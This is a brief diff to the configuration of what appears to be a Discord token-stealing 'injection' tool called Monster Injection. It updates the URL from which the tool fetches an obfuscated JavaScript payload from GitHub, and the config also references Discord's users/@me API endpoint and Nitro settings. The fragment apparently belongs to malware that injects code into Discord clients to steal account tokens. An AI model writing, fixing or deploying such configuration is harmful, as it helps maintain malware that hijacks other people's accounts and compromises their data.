@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Monster Injection', 
   embed_icon: 'https://raw.githubusercontent.com/monsterservices/monster-injection/monster-injection/imgs/pfp.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/monsterservices/monster-injection/monster-injection/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/monsterservices/monster-injection/main/monster-injection/obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
